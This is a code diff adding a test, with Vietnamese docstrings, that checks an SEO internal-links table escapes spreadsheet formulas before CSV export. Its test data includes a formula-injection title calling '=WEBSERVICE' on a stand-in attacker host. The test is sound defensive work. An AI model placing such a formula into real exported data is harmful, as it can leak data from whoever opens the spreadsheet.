@@ -318,6 +318,23 @@ def test_review_cells_cannot_become_excel_formulas(project_root, site, monkeypat
     assert not any(value.startswith(("=", "+", "-", "@", "\t", "\r")) for value in cells)
 
 
+def test_seo_links_table_cells_cannot_become_excel_formulas(project_root, seo_ai, wordpress):
+    """LC-T101-1 ở bước SEO: bảng liên kết nội bộ (``st.data_editor``, có nút tải CSV) hiện cụm từ
+    AI chọn và tên bài trên website qua ``safe_text`` (thêm một dấu cách đầu cho ô dạng công
+    thức); nháp vẫn giữ đúng cụm từ, cột «Dùng» vẫn đọc lại đúng."""
+    title = '=WEBSERVICE("https://evil.example") cổng inox'
+    wordpress.items = [seo_ui.published(11, title, "cong-inox")]
+    snap = ui.article(seo=DraftSeo(links=[DraftLink(section=1, anchor="=SUM cửa sắt", post_id=11)]))
+    at, _pid = ui.open_article(project_root, snap)
+    at.session_state["step"] = 3
+    run_ok(at.run())
+    (rows,) = [
+        t.value.to_dict("records") for t in at.dataframe if "Cụm từ trong bài" in t.value.columns
+    ]
+    assert rows == [{"Dùng": True, "Cụm từ trong bài": " =SUM cửa sắt", "Trỏ tới bài": " " + title}]
+    assert [link.anchor for link in at.session_state["seo_links"]] == ["=SUM cửa sắt"]
+
+
 def test_changed_between_view_and_click_sends_nothing(project_root, site, sent, monkeypatch):
     """LC-T094-38: lúc bấm dựng lại gói (danh sách bài vừa tải lại khác: bài đích đổi địa chỉ) và
     so mã băm với bài người dùng vừa xem: khác thì không gửi gì, báo xem lại."""
